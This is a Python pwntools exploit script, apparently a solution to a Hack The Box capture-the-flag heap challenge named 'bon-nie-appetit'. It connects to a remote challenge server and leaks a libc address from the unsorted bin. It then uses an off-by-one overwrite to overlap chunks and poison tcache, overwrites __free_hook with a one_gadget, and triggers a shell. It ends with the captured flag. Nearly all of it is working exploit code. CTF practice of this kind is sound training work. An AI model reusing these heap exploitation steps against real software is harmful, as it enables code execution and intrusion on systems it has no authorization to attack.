#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template bon-nie-appetit
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('bon-nie-appetit')
context.arch = 'amd64'
# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
#b *new_order+127
#b *delete_order+156
#b *edit_order+215
#b *new_order+216
#b edit_order
b show_order
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Full RELRO
# Stack:    Canary found
# NX:       NX enabled
# PIE:      PIE enabled
# RUNPATH:  b'./glibc/'

#io = start()
io = remote('178.62.73.26', 31326)

def order(size, data):
    io.sendafter(b'> ', b'1')
    io.sendafter(b': ', str(size))
    io.sendafter(b': ', data)

def show(idx):
    io.sendafter(b'> ', b'2')
    io.sendafter(b': ', str(idx))

def edit(idx, data):
    io.sendafter(b'> ', b'3')
    io.sendafter(b': ', str(idx))
    io.sendafter(b': ', data)

def delete(idx):
    io.sendafter(b'> ', b'4')
    io.sendafter(b': ', str(idx))

order(0x20, b'lmao')
order(0x20, b'lmao')
order(0x4ff, b'unsorted')
order(0x20, b'lmao')
order(0x20, b'lmao')

delete(0)
delete(1)
delete(2)

order(0x4ff, b'\x01')
show(0)

# Grab libc from unsorted bin after reclaiming heap
io.recvuntil(b'=> ')
libc_leak = int.from_bytes(io.recvline().rstrip(), 'little')
print(f'[+] libc leak: {hex(libc_leak)}')
libc_base = libc_leak - 0x3ebc01
print(f'[+] libc base: {hex(libc_base)}')
og = libc_base + 0x10a2fc
free_hook = libc_base + 0x3ed8e8

delete(0)

# Set up off by one poisoning
order(0xf8, b'A'*0xf8)
order(0xf8, b'B'*0xf8)
order(0xf8, b'C'*0xf8)

delete(2)
delete(0)

# Overwrite next chunk size to 0x181
order(0xf8, b"J"*0xf8 + b'\x81')
edit(0, b'J'*0xf8 +b'\x81')
delete(1)

# Overwrite __free_hook with one gadget
order(0x178, b'K'*0x100 + p64(free_hook))
order(0xf8, b'\x00')
order(0xf8, p64(og))

# Trigger one_gadget via free()
delete(4)

io.interactive()
# HTB{0n3_l1bc_2.27_w1th_3xtr4_tc4ch3_pl3453}
